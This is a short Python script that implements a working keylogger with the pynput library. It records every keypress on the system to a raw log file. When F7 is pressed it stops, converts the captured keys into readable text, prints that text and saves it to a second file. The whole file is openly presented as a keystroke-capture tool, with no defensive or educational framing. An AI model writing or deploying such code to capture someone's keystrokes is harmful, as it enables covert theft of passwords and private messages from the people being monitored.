from pynput.keyboard import Listener, Key


class KeyLogger:

    def __init__(self, raw_log, parsed_log):
        self.raw_log = raw_log
        self.parsed_log = parsed_log
        self.stop_key = Key.f7

    def log_key(self, key):
        keypress = str(key)
        keypress = keypress.replace("'", '').replace('\n', ' ')
        with open(self.raw_log, 'a') as log_file:
            log_file.write(keypress + '\n')
        if key == self.stop_key:
            self.process_log()
            # Stop listener
            return False

    def log(self):
        with Listener(on_press=self.log_key) as keystroke_ear:
            keystroke_ear.join()

    def process_log(self):
        with open(self.raw_log, 'r') as raw:
            string_list = raw.readlines()
            text = ''.join(string_list).replace('\n', '')
            text = text\
                .replace('Key.space', ' ')\
                .replace('Key.shift', '')\
                .replace('Key.backspace', '<back>')\
                .replace('Key.esc', '<Esc>')\
                .replace('Key.f7', '<F7>')
            print(text)
            with open(self.parsed_log, 'w') as parsed:
                parsed.write(text)


if __name__ == '__main__':

    raw_log = 'raw_log.txt'
    parsed_log = 'parsed_log.txt'

    kl = KeyLogger(raw_log, parsed_log)
    kl.log()